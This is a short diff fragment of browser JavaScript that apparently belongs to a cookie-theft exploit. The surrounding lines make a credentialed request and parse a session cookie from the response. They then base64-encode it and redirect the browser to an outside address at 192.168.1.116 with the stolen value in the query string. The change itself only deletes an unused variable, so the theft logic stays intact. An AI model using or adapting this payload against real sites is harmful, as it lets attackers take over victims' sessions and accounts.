@@ -220,7 +220,6 @@ req.withCredentials=true;
 req.open("GET",url,false);
 req.send();
 function reqListener() {
-    var req2=new XMLHttpRequest();
     const sess=JSON.parse(this.responseText).cookie;
     location.href="http://192.168.1.116/?data="+btoa(sess);
 };
